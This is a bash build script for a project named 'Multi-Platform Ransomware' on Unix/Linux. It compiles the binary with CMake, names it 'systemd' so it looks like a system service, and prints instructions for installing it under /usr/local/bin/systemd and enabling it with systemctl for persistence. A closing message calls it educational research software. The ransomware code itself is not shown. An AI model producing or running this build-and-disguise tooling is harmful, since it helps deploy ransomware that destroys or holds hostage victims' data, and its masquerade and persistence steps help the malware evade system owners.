#!/bin/bash

echo "[*] Building Multi-Platform Ransomware for Unix/Linux..."

# Check if we're on Unix/Linux
if [[ "$OSTYPE" != "linux-gnu"* && "$OSTYPE" != "darwin"* && "$OSTYPE" != "freebsd"* ]]; then
    echo "[!] This build script is for Unix/Linux systems only"
    exit 1
fi

# Check dependencies
echo "[*] Checking dependencies..."

# Check for CMake
if ! command -v cmake &> /dev/null; then
    echo "[!] CMake is not installed"
    echo "[!] Install with: sudo apt-get install cmake (Ubuntu/Debian)"
    echo "[!]              sudo dnf install cmake (Fedora/RHEL)"
    echo "[!]              sudo pacman -S cmake (Arch/Manjaro)"
    exit 1
fi

# Check for OpenSSL development headers
if ! ldconfig -p | grep -q libssl; then
    echo "[!] OpenSSL development libraries not found"
    echo "[!] Install with: sudo apt-get install libssl-dev (Ubuntu/Debian)"
    echo "[!]              sudo dnf install openssl-devel (Fedora/RHEL)"
    echo "[!]              sudo pacman -S openssl (Arch/Manjaro)"
    exit 1
fi

# Check for pthread library
if ! ldconfig -p | grep -q libpthread; then
    echo "[!] pthread library not found"
    echo "[!] Install with: sudo apt-get install libc6-dev (Ubuntu/Debian)"
    echo "[!]              sudo dnf install glibc-devel (Fedora/RHEL)"
    echo "[!]              sudo pacman -S glibc (Arch/Manjaro)"
    exit 1
fi

# Create build directory
if [ -d "build" ]; then
    echo "[*] Cleaning previous build..."
    rm -rf build
fi

mkdir build
cd build

echo "[*] Running CMake configuration..."
cmake .. -f ../CMakeLists_unix.txt -DCMAKE_BUILD_TYPE=Release

if [ $? -ne 0 ]; then
    echo "[!] CMake configuration failed"
    exit 1
fi

echo "[*] Building Release configuration..."
make -j$(nproc)

if [ $? -ne 0 ]; then
    echo "[!] Build failed"
    exit 1
fi

echo "[*] Build completed successfully"
echo "[*] Binary located at: build/bin/systemd"

echo "[*] Copying to project root..."
cp "bin/systemd" "../ransomware"

# Set executable permissions
chmod +x "../ransomware"

echo "[*] Setting up stealth permissions..."
# Make the binary look like a system service
chmod 755 "../ransomware"

cd ..

echo "[+] Multi-Platform Ransomware built successfully!"
echo "[+] Executable: ./ransomware"
echo "[+] Platform: Unix/Linux"
echo "[+] Size: $(du -h ransomware | cut -f1)"

echo ""
echo "[*] Testing binary..."
if ./ransomware --test &> /dev/null; then
    echo "[+] Binary test passed"
else
    echo "[!] Binary test failed (may be normal if --test not implemented)"
fi

echo ""
echo "[*] Installation for persistence (requires root):"
echo "    sudo cp ransomware /usr/local/bin/systemd"
echo "    sudo chmod 755 /usr/local/bin/systemd"
echo "    sudo systemctl enable systemd  # If using systemd service file"

echo ""
echo "[!] WARNING: This is educational malware research software"
echo "[!] Use only in authorized testing environments"
echo "[!] Unauthorized use is illegal and unethical"
